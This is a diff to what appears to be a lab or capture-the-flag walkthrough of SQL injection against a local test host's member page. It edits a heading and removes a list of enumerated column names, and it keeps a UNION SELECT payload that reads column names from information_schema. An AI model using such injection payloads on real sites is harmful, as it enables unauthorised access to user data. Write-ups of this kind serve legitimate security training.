@@ -14,7 +14,7 @@ is_nullable: Indicates whether the column can contain null or not.
 
 
 
-1.) Navigate to the member page 
+1.) Where to find
 
 http://192.168.1.100/index.php?page=member
 
@@ -34,16 +34,6 @@ after running that you find that the table name is 'users'
 ''
 -1  UNION SELECT  column_name, 1 FROM information_schema.columns where table_schema = database() 
 ''
-when we run that we get the following names back 
-
-user_id
-first_name
-last_name
-town
-country 
-planet
-commentaire
-countersign 
 
 3.) Getting the users on the site from the information we have just gotten
 ''  
